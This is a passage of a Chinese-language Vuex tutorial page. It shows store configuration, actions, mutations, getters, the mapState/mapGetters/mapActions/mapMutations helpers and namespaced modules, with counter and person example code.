class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//引入Vue核心库</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-comment">//引入Vuex</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><span class="hljs-comment">//引用Vuex</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>)<br><br><span class="hljs-keyword">const</span> actions = &#123;<br>    <span class="hljs-comment">//响应组件中加的动作</span><br><span class="hljs-title function_">jia</span>(<span class="hljs-params">context,value</span>)&#123;<br><span class="hljs-comment">// console.log(&#x27;actions中的jia被调用了&#x27;,miniStore,value)</span><br>context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;JIA&#x27;</span>,value)<br>&#125;,<br>&#125;<br><br><span class="hljs-keyword">const</span> mutations = &#123;<br>    <span class="hljs-comment">//执行加</span><br><span class="hljs-title function_">JIA</span>(<span class="hljs-params">state,value</span>)&#123;<br><span class="hljs-comment">// console.log(&#x27;mutations中的JIA被调用了&#x27;,state,value)</span><br>state.<span class="hljs-property">sum</span> += value<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//初始化数据</span><br><span class="hljs-keyword">const</span> state = &#123;<br>   <span class="hljs-attr">sum</span>:<span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-comment">//创建并暴露store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>actions,<br>mutations,<br>state,<br>&#125;)<br></code></pre></td></tr></table></figure><pre><code class="hljs">2. 组件中读取vuex中的数据：`$store.state.sum`3. 组件中修改vuex中的数据：`$store.dispatch(&#39;action中的方法名&#39;,数据)`或 `$store.commit(&#39;mutations中的方法名&#39;,数据)`</code></pre><blockquote><p>备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写<code>dispatch</code>，直接编写<code>commit</code></p></blockquote><p>具体案例：</p><p>src&#x2F;store&#x2F;index.js该文件用于创建Vuex中最为核心的store</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//该文件用于创建Vuex中最为核心的store</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-comment">//引入Vuex</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vuex</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vuex&#x27;</span><br><span class="hljs-comment">//应用Vuex插件</span><br><span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Vuex</span>)<br><br><span class="hljs-comment">//准备actions——用于响应组件中的动作</span><br><span class="hljs-keyword">const</span> actions = &#123;<br><span class="hljs-comment">/* jia(context,value)&#123;</span><br><span class="hljs-comment">console.log(&#x27;actions中的jia被调用了&#x27;)</span><br><span class="hljs-comment">context.commit(&#x27;JIA&#x27;,value)</span><br><span class="hljs-comment">&#125;,</span><br><span class="hljs-comment">jian(context,value)&#123;</span><br><span class="hljs-comment">console.log(&#x27;actions中的jian被调用了&#x27;)</span><br><span class="hljs-comment">context.commit(&#x27;JIAN&#x27;,value)</span><br><span class="hljs-comment">&#125;, */</span><br><span class="hljs-title function_">jiaOdd</span>(<span class="hljs-params">context,value</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;actions中的jiaOdd被调用了&#x27;</span>)<br><span class="hljs-keyword">if</span>(context.<span class="hljs-property">state</span>.<span class="hljs-property">sum</span> % <span class="hljs-number">2</span>)&#123;<br>context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;JIA&#x27;</span>,value)<br>&#125;<br>&#125;,<br><span class="hljs-title function_">jiaWait</span>(<span class="hljs-params">context,value</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;actions中的jiaWait被调用了&#x27;</span>)<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;JIA&#x27;</span>,value)<br>&#125;,<span class="hljs-number">500</span>)<br>&#125;<br>&#125;<br><span class="hljs-comment">//准备mutations——用于操作数据（state）</span><br><span class="hljs-keyword">const</span> mutations = &#123;<br><span class="hljs-title function_">JIA</span>(<span class="hljs-params">state,value</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mutations中的JIA被调用了&#x27;</span>)<br>state.<span class="hljs-property">sum</span> += value<br>&#125;,<br><span class="hljs-title function_">JIAN</span>(<span class="hljs-params">state,value</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mutations中的JIAN被调用了&#x27;</span>)<br>state.<span class="hljs-property">sum</span> -= value<br>&#125;<br>&#125;<br><span class="hljs-comment">//准备state——用于存储数据</span><br><span class="hljs-keyword">const</span> state = &#123;<br><span class="hljs-attr">sum</span>:<span class="hljs-number">0</span> <span class="hljs-comment">//当前的和</span><br>&#125;<br><br><span class="hljs-comment">//创建并暴露store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>actions,<br>mutations,<br>state,<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;Count.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>&lt;div&gt;<br>&lt;h1&gt;当前求和为：&#123;&#123; $store.state.sum &#125;&#125;&lt;/h1&gt;<br>&lt;select v-model.number=&quot;n&quot;&gt;<br>&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;<br>&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;<br>&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;<br>&lt;/select&gt;<br>&lt;button @click=&quot;increment&quot;&gt;+&lt;/button&gt;<br>&lt;button @click=&quot;decrement&quot;&gt;-&lt;/button&gt;<br>&lt;button @click=&quot;incrementOdd&quot;&gt;当前求和为奇数再加&lt;/button&gt;<br>&lt;button @click=&quot;incrementWait&quot;&gt;等一等再加&lt;/button&gt;<br>&lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>name:&#x27;Count&#x27;,<br>data() &#123;<br>return &#123;<br>n:1, //用户选择的数字<br>&#125;<br>&#125;,<br>methods: &#123;<br>increment()&#123;<br>this.$store.commit(&#x27;JIA&#x27;,this.n)<br>&#125;,<br>decrement()&#123;<br>this.$store.commit(&#x27;JIAN&#x27;,this.n)<br>&#125;,<br>incrementOdd()&#123;<br>this.$store.dispatch(&#x27;jiaOdd&#x27;,this.n)<br>&#125;,<br>incrementWait()&#123;<br>this.$store.dispatch(&#x27;jiaWait&#x27;,this.n)<br>&#125;,<br>&#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style lang=&quot;css&quot;&gt;button&#123;margin-left: 5px;&#125;&lt;/style&gt;<br></code></pre></td></tr></table></figure><h2 id="3-5-getters的使用"><a href="#3-5-getters的使用" class="headerlink" title="3.5 getters的使用"></a>3.5 getters的使用</h2><ol><li><p>概念：当state中的数据需要经过加工后再使用时，可以使用getters加工，相当于全局计算属性。</p></li><li><p>在<code>store.js</code>中追加<code>getters</code>配置</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">......<br><br><span class="hljs-keyword">const</span> getters = &#123;<br><span class="hljs-title function_">bigSum</span>(<span class="hljs-params">state</span>)&#123;<br><span class="hljs-keyword">return</span> state.<span class="hljs-property">sum</span> * <span class="hljs-number">10</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 创建并暴露store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>......<br>getters<br>&#125;)<br></code></pre></td></tr></table></figure><pre><code class="hljs">3. 组件中读取数据：`$store.getters.bigSum`</code></pre><h2 id="3-6-四个map方法的使用"><a href="#3-6-四个map方法的使用" class="headerlink" title="3.6 四个map方法的使用"></a>3.6 四个map方法的使用</h2><p>导入  <code>import &#123;mapState, mapGetters, mapActions, mapMutations&#125; from &#39;vuex&#39;</code></p><ol><li><p><strong>mapState方法 ：</strong>用于帮助我们映射<code>state</code>中的数据为计算属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">computed</span>: &#123;<br>  <span class="hljs-comment">// 借助mapState生成计算属性：sum、school、subject（对象写法一）</span><br>  ...<span class="hljs-title function_">mapState</span>(&#123;<span class="hljs-attr">sum</span>:<span class="hljs-string">&#x27;sum&#x27;</span>,<span class="hljs-attr">school</span>:<span class="hljs-string">&#x27;school&#x27;</span>,<span class="hljs-attr">subject</span>:<span class="hljs-string">&#x27;subject&#x27;</span>&#125;),<br><br>  <span class="hljs-comment">// 借助mapState生成计算属性：sum、school、subject（数组写法二）</span><br>  ...<span class="hljs-title function_">mapState</span>([<span class="hljs-string">&#x27;sum&#x27;</span>,<span class="hljs-string">&#x27;school&#x27;</span>,<span class="hljs-string">&#x27;subject&#x27;</span>]),<br>&#125;,<br></code></pre></td></tr></table></figure></li><li><p><strong>mapGetters方法 ：</strong>用于帮助我们映射<code>getters</code>中的数据为计算属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">computed</span>: &#123;<br>    <span class="hljs-comment">//借助mapGetters生成计算属性：bigSum（对象写法一）</span><br>    ...<span class="hljs-title function_">mapGetters</span>(&#123;<span class="hljs-attr">bigSum</span>:<span class="hljs-string">&#x27;bigSum&#x27;</span>&#125;),<br><br>    <span class="hljs-comment">//借助mapGetters生成计算属性：bigSum（数组写法二）</span><br>    ...<span class="hljs-title function_">mapGetters</span>([<span class="hljs-string">&#x27;bigSum&#x27;</span>])<br>&#125;,<br></code></pre></td></tr></table></figure></li><li><p><strong>mapActions方法 ：</strong>用于帮助我们生成与<code>actions</code>对话的方法，即：包含<code>$store.dispatch(xxx)</code>的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">methods</span>:&#123;<br>    <span class="hljs-comment">//靠mapActions生成：incrementOdd、incrementWait（对象形式）</span><br>    ...<span class="hljs-title function_">mapActions</span>(&#123;<span class="hljs-attr">incrementOdd</span>:<span class="hljs-string">&#x27;jiaOdd&#x27;</span>,<span class="hljs-attr">incrementWait</span>:<span class="hljs-string">&#x27;jiaWait&#x27;</span>&#125;)<br><br>    <span class="hljs-comment">//靠mapActions生成：incrementOdd、incrementWait（数组形式）</span><br>    ...<span class="hljs-title function_">mapActions</span>([<span class="hljs-string">&#x27;jiaOdd&#x27;</span>,<span class="hljs-string">&#x27;jiaWait&#x27;</span>])<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>mapMutations方法 ：</strong>用于帮助我们生成与<code>mutations</code>对话的方法，即：包含<code>$store.commit(xxx)</code>的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">methods</span>:&#123;<br>    <span class="hljs-comment">//靠mapActions生成：increment、decrement（对象形式）</span><br>    ...<span class="hljs-title function_">mapMutations</span>(&#123;<span class="hljs-attr">increment</span>:<span class="hljs-string">&#x27;JIA&#x27;</span>,<span class="hljs-attr">decrement</span>:<span class="hljs-string">&#x27;JIAN&#x27;</span>&#125;),<br>    <br>    <span class="hljs-comment">//靠mapMutations生成：JIA、JIAN（对象形式）</span><br>    ...<span class="hljs-title function_">mapMutations</span>([<span class="hljs-string">&#x27;JIA&#x27;</span>,<span class="hljs-string">&#x27;JIAN&#x27;</span>]),<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则传的参数是事件对象(event)。</p></blockquote><p>具体案例：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>&lt;div&gt;<br>&lt;h1&gt;当前求和为：&#123;&#123; sum &#125;&#125;&lt;/h1&gt;<br>&lt;h3&gt;当前求和的10倍为：&#123;&#123; bigSum &#125;&#125;&lt;/h3&gt;<br>&lt;h3&gt;我是&#123;&#123; name &#125;&#125;，我在&#123;&#123; school &#125;&#125;学习&lt;/h3&gt;<br>&lt;select v-model.number=&quot;n&quot;&gt;<br>&lt;option value=&quot;1&quot;&gt;1&lt;/option&gt;<br>&lt;option value=&quot;2&quot;&gt;2&lt;/option&gt;<br>&lt;option value=&quot;3&quot;&gt;3&lt;/option&gt;<br>&lt;/select&gt;<br>&lt;button @click=&quot;increment(n)&quot;&gt;+&lt;/button&gt;<br>&lt;button @click=&quot;decrement(n)&quot;&gt;-&lt;/button&gt;<br>&lt;button @click=&quot;addOdd(n)&quot;&gt;当前求和为奇数再加&lt;/button&gt;<br>&lt;button @click=&quot;addWait(n)&quot;&gt;等一等再加&lt;/button&gt;<br>&lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import &#123;mapState, mapGetters, mapMutations, mapActions&#125; from &#x27;vuex&#x27;//🔴<br><br>export default &#123;<br>name: &#x27;Count&#x27;,<br>data() &#123;<br>return &#123;<br>n:1, //用户选择的数字<br>&#125;<br>&#125;,<br>  computed: &#123;<br>...mapState([&#x27;sum&#x27;,&#x27;school&#x27;,&#x27;name&#x27;]),<br>...mapGetters([&#x27;bigSum&#x27;])<br>&#125;,<br>methods: &#123;<br>...mapMutations(&#123;increment:&#x27;ADD&#x27;, decrement:&#x27;SUBTRACT&#x27;&#125;),<br>...mapActions([&#x27;addOdd&#x27;, &#x27;addWait&#x27;])<br>&#125;,<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br>button&#123;<br>margin-left: 5px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></td></tr></table></figure><p>​    </p><h2 id="3-7-模块化-命名空间"><a href="#3-7-模块化-命名空间" class="headerlink" title="3.7 模块化+命名空间"></a>3.7 模块化+命名空间</h2><ol><li><p>目的：让代码更好维护，让多种数据分类更加明确。</p></li><li><p>修改<strong>store.js</strong><br>为了解决不同模块命名冲突的问题，将不同模块的namespaced: true，之后在不同页面中引入<strong>getter</strong> <strong>actions</strong> <strong>mutations</strong>时，需要加上所属的模块名</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> countAbout = &#123;<br>  <span class="hljs-attr">namespaced</span>: <span class="hljs-literal">true</span>,<span class="hljs-comment">// 开启命名空间</span><br>  <span class="hljs-attr">state</span>: &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">1</span>&#125;,<br>  <span class="hljs-attr">mutations</span>: &#123; ... &#125;,<br>  <span class="hljs-attr">actions</span>: &#123; ... &#125;,<br>  <span class="hljs-attr">getters</span>: &#123;<br>    <span class="hljs-title function_">bigSum</span>(<span class="hljs-params">state</span>)&#123; <span class="hljs-keyword">return</span> state.<span class="hljs-property">sum</span> * <span class="hljs-number">10</span> &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> personAbout = &#123;<br>  <span class="hljs-attr">namespaced</span>: <span class="hljs-literal">true</span>,<span class="hljs-comment">// 开启命名空间</span><br>  <span class="hljs-attr">state</span>: &#123; ... &#125;,<br>  <span class="hljs-attr">mutations</span>: &#123; ... &#125;,<br>  <span class="hljs-attr">actions</span>: &#123; ... &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> store = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuex</span>.<span class="hljs-title class_">Store</span>(&#123;<br>  <span class="hljs-attr">modules</span>: &#123;<br>    countAbout,<br>    personAbout<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure></li></ol><pre><code class="hljs">3. 开启命名空间后，组件中读取**state**数据：</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//方式一：自己直接读取</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-property">state</span>.<span class="hljs-property">personAbout</span>.<span class="hljs-property">list</span><br><span class="hljs-comment">//方式二：借助mapState读取：</span><br><span class="hljs-comment">// 用 mapState 取 countAbout 中的state 必须加上 &#x27;countAbout&#x27;</span><br>...<span class="hljs-title function_">mapState</span>(<span class="hljs-string">&#x27;countAbout&#x27;</span>,[<span class="hljs-string">&#x27;sum&#x27;</span>,<span class="hljs-string">&#x27;school&#x27;</span>,<span class="hljs-string">&#x27;subject&#x27;</span>]),<br></code></pre></td></tr></table></figure><ol start="4"><li>开启命名空间后，组件中读取<strong>getters</strong>数据：</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//方式一：自己直接读取</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-property">getters</span>[<span class="hljs-string">&#x27;personAbout/firstPersonName&#x27;</span>]<br><span class="hljs-comment">//方式二：借助mapGetters读取：</span><br>...<span class="hljs-title function_">mapGetters</span>(<span class="hljs-string">&#x27;countAbout&#x27;</span>,[<span class="hljs-string">&#x27;bigSum&#x27;</span>])<br></code></pre></td></tr></table></figure><pre><code class="hljs">5. 开启命名空间后，组件中调用**dispatch**</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//方式一：自己直接dispatch</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">dispatch</span>(<span class="hljs-string">&#x27;personAbout/addPersonWang&#x27;</span>,person)<br><span class="hljs-comment">//方式二：借助mapActions：</span><br>...<span class="hljs-title function_">mapActions</span>(<span class="hljs-string">&#x27;countAbout&#x27;</span>,&#123;<span class="hljs-attr">incrementOdd</span>:<span class="hljs-string">&#x27;jiaOdd&#x27;</span>,<span class="hljs-attr">incrementWait</span>:<span class="hljs-string">&#x27;jiaWait&#x27;</span>&#125;)<br></code></pre></td></tr></table></figure><pre><code class="hljs">6. 开启命名空间后，组件中调用**commit**</code></pre><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//方式一：自己直接commit</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$store</span>.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;personAbout/ADD_PERSON&#x27;</span>,person)<br><span class="hljs-comment">//方式二：借助mapMutations：</span><br>...<span class="hljs-title function_">mapMutations</span>(<span class="hljs-string">&#x27;countAbout&#x27;</span>,&#123;<span class="hljs-attr">increment</span>:<span class="hljs-string">&#x27;JIA&#x27;</span>,<span class="hljs-attr">decrement</span>:<span class="hljs-string">&#x27;JIAN&#x27;</span>&#125;),<br></code></pre></td></tr></table></figure><p>具体案例：<br>count.js</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-attr">namespaced</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">actions</span>: &#123;<br>        <span class="hljs-title function_">addOdd</span>(<span class="hljs-params">context, value</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;actions中的addOdd被调用了&quot;</span>)<br>            <span class="hljs-keyword">if</span> (context.<span class="hljs-property">state</span>.<span class="hljs-property">sum</span> % <span class="hljs-number">2</span>) &#123;<br>                context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>            &#125;<br>        &#125;,<br>        <span class="hljs-title function_">addWait</span>(<span class="hljs-params">context, value</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;actions中的addWait被调用了&quot;</span>)<br>            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>                context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>            &#125;, <span class="hljs-number">500</span>)<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">mutations</span>: &#123;<br>        <span class="hljs-title function_">ADD</span>(<span class="hljs-params">state, value</span>) &#123;<br>            state.<span class="hljs-property">sum</span> += value<br>        &#125;,<br>        <span class="hljs-title function_">SUBTRACT</span>(<span class="hljs-params">state, value</span>) &#123;<br>            state.<span class="hljs-property">sum</span> -= value<br>        &#125;<br>    &#125;,<br>    <span class="hljs-attr">state</span>: &#123;<br>        <span class="hljs-attr">sum</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">school</span>: <span class="hljs-string">&#x27;尚硅谷&#x27;</span>,<br>        <span class="hljs-attr">subject</span>: <span class="hljs-string">&#x27;前端&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">getters</span>: &#123;<br>        <span class="hljs-title function_">bigSum</span>(<span class="hljs-params">state</span>) &#123;<br>            <span class="hljs-keyword">return</span> state.<span class="hljs-property">sum</span> * <span class="hljs-number">10</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>person.js</p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;axios&quot;</span><br><span class="hljs-keyword">import</span> &#123; nanoid &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;nanoid&quot;</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span>&#123;<br>    <span class="hljs-attr">namespaced</span>:<span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">actions</span>:&#123;<br>        <span class="hljs-title function_">addPersonWang</span>(<span class="hljs-params">context,value</span>)&#123;<br>            <span class="hljs-keyword">if</span>(value.<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&#x27;王&#x27;</span>) === <span class="hljs-number">0</span>)&#123;<br>                context.<span class="hljs-title function_">commit</span>(<span class="hljs-string">&#x27;ADD_PERSON&#x27;</span>,value)<br>            &#125;<span 